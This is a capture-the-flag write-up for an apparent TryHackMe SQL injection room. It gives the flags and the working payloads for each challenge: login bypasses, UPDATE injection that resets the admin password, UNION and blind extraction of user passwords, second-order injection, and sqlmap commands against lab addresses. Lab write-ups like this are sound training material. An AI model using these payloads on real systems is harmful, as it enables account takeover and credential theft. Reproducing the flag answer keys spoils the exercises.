# SQL Injection

## Introduction to SQL Injection: Part 1

1. What is the flag for SQL Injection 1: Input Box Non-String?
   Ans:`THM{dccea429d73d4a6b4f117ac64724f460}`
   Payload:`1 or 1=1`, Since its directly entering the

2. What is the flag for SQL Injection 2: Input Box String?
   Ans:`THM{356e9de6016b9ac34e02df99a5f755ba}`
   Payload: `'OR 1=1`, ' is used to escape and 1=1 bypasses the check.

3. What is the flag for SQL Injection 3: URL Injection?
   Ans:`THM{645eab5d34f81981f5705de54e8a9c36}`
   Since client-side validation happens using js. Sending the request directly via url with url encoding bypasses it. Payload:`-1%27%20or%201=1--%20-&password=a`

4. What is the flag for SQL Injection 4: POST Injection?
   Ans:`THM{727334fd0f0ea1b836a8d443f09dc8eb}`
   Request is made using POST method so use burp to inject Payload in request.Payload:`1' or 1=1--`

## Introduction to SQL Injection: Part 2

1. What is the flag for SQL Injection 5: UPDATE Statement?
   Ans:`THM{b3a540515dbd9847c29cffa1bef1edfb}`

   **Identify the database server:**

   Mostly the sql statement be like this: `UPDATE <table_name> SET nickName='name', email='email' WHERE <condition>`

   ```bash
    # MySQL and MSSQL
    ',nickName=@@version,email='

    # For Oracle
    ',nickName=(SELECT banner FROM v$version),email='

    # For SQLite
    ',nickName=sqlite_version(),email='
   ```

   Payload:`nickName=test',nickName=sqlite_version(),email='&email=test&password=password`

   Get the table name, use this payload which saves sql command output in a feild.`nickName=test', nickName=(SELECT tbl_name FROM sqlite_master WHERE type='table')--&email=test&password=password`

   Table name is `usertable`, get column name in that table using this payload:`nickName=test', nickName=(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='usertable')--&email=test&password=password`.

   Table columns are:

   ```
   `UID` integer primary key,
   `name` varchar(30) NOT NULL,
   `profileID` varchar(20) DEFAULT NULL,
   `salary` int(9) DEFAULT NULL,
   `passportNr` varchar(20) DEFAULT NULL,
   `email` varchar(300) DEFAULT NULL,
   `nickName` varchar(300) DEFAULT NULL,
   `password` varchar(300) DEFAULT NULL
   ```

   Get names from uertable using this payload `',nickName=(SELECT group_concat(profileID || "," || name || "," || password || ":") from usertable),email='`
   After getting the name:UID which are `Admin:99` update Admin's password to sha256 hash of "Password123" using the payload `', password='008c70392e3abfbd0fa47bbc2ed96aa99bd49e159727fcba0f2e6abeb3a9d601' WHERE name='Admin'-- -`

   Log in as admin and list the tables using `',nickName=(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'),email='`

   Cat the flag by using the payload `',nickName=(SELECT group_concat(id || "," || author|| "," || secret|| ":") from secrets),email='`

## Vulnerable Startup: Broken Authentication

1. What is the flag for this challenge?:
   Ans:`THM{f35f47dcd9d596f0d3860d14cd4c68ec}`
   Payload: `' OR 1=1 --`

## Vulnerable Startup: Broken Authentication 2

1.  What is the flag for this challenge?
    Ans:`THM{fb381dfee71ef9c31b93625ad540c9fa}`
    Logged in as f and got the cookie:value as `session:.eJxdjzFvwyAQhf_LzR7O2IBhq9QlS7bO1gFHi4rtFBJFUZT_XqxGrdTxvvv09N4d_AflzOs7i_lSucwpgNXdf7zSwmAhQgeV61dOcg50JrB3eDu8glUd8EIpN6cpT_slLGndz-Q_jz_oxrWBE9V62sr5WBqaFEohJfYjTuPzed1KqwGIk9c4GMEDuegCRhq1c15wMIrIGBdGw700WujoHWEUrMixG8gEhf2eVraYMu8dwZi9PmUqN7A94uNvzO909fgGuStVBQ.ab1xLg.nzqzTUsmpvxgHYIUMFX2ZItEIfk`
    Payload:`' UNION SELECT 1, password from users-- -`

## Vulnerable Startup: Broken Authentication 3(Blind Injection)

1. What is the flag for this challenge?
   Ans:` THM{f1f4e0757a09a0b87eeb2f33bca6a5cb}`

   `SUBSTR( string, <start>, <length>)`: Trims the string, Its a sqlite function.
   `(SELECT password FROM users LIMIT 0,1)`: The LIMIT clause is used to limit the amount of data returned by the SELECT statement. The first number, 0, is the offset and the second integer is the limit.:

   ````sqlite
   sqlite> SELECT password FROM users LIMIT 0,1
   THM{Blind}```
   ````

   To check if we have guessed correct first character of password, We could do as follows:`SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = 'T'`

   Now there's an issue, what if password is stored as small letters?:`"x,X: The argument is an integer which is displayed in hexadecimal. Lower-case hexadecimal is used for %x and upper-case is used for %X"`

   `SUBSTR((SELECT password FROM users LIMIT 0,1),1,1) = CAST(X'54' as Text)`:x'54

   Check for the length of password:`admin' AND length((SELECT password from users where username='admin'))==37-- -`
   Use the script provided by the app to exploit it.
   Or we can use `sqlmap` to exploit it:`sqlmap -u http://10.49.163.163:5000/challenge3/login --data="username=admin&password=admin" --level=5 --risk=3 --dbms=sqlite --technique=b --dump`

## Vulnerable Startup:Vulnerable Notes

1. What is the flag for this challenge?
   Ans:`THM{4644c7e157fd5498e7e4026c89650814}`

   Query 1 :`INSERT INTO notes (username, title, note) VALUES (?, ?, ?)`
   Query 2 :`SELECT title, note FROM notes WHERE username = 'f'`

   Notes Uses parameterized queries, but if server doesn't sanitize it then malicious code can still be run.

   Query 1 has parameterized queries which would make it tough to inject payload. But the Query 2 doesnt use parameterized queries so we can register a malicious sql code as username and exploit it. First let me check if it works or not:`' union select 1,2'`

   To get table name we register a username:`' union select 1,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%''`
   Now we know that database has `users,notes` tables.

   Now we should find passwords for all users.:`'union select 1,group_concat(password) from users'`

   We can use sqlmap with tamper script to automate this [script](tamper-script.py)
   Run sqlmap:`sqlmap --tamper tamper-script.py --url http://10.10.1.134:5000/challenge4/signup  --data "username=admin&password=asd" --second-url http://10.10.1.134:5000/challenge4/notes  -p username --dbms sqlite --technique=U --no-cast`

## Vulnerable Startup:Change Password

1. What is the flag for this challenge?
   Ans:`THM{cd5c4f197d708fda06979f13d8081013}`

   To update password server uses this Query:`UPDATE users SET password = ? WHERE username = 'f'`
   username is directly concated so we register as `admin' -- -`
   When updating the password it will update password for admin.

## Vulnerable Startup:Book Title

1. What is the flag for this challenge?
   Ans:`THM{27f8f7ce3c05ca8d6553bc5948a89210}`
   use `') or 1=1 --`
   Vulnerable so know the number of columns in table by `') order by 1 -- -`, try different numbers to enumerate the columns.
   Then try `') order by 1,2,3,4 -- - `: Now we know that 2,3,4 are vulnerable

   Use this payload `') union select 1,group_concat(username),group_concat(password),4 from users-- -`

## Vulnerable Startup:Book Title 2

1. What is the flag for this challenge?
   Ans:`THM{183526c1843c09809695a9979a672f09}`

   `' OR 1 = 1 --` : Returns all and polluted second query.
   `' union select '-1''union select 1,2,3,4-- -` makes the queries:

   Query 1:
   `SELECT id FROM books WHERE title like '' union select '-1''union select 1,2,3,4-- -%'`
   Query 2:
   `SELECT * FROM books WHERE id = '-1'union select 1,2,3,4-- -%'`

   By using the query:`' union select '-1''union select 1,group_concat(username),group_concat(password),4 from users-- -`
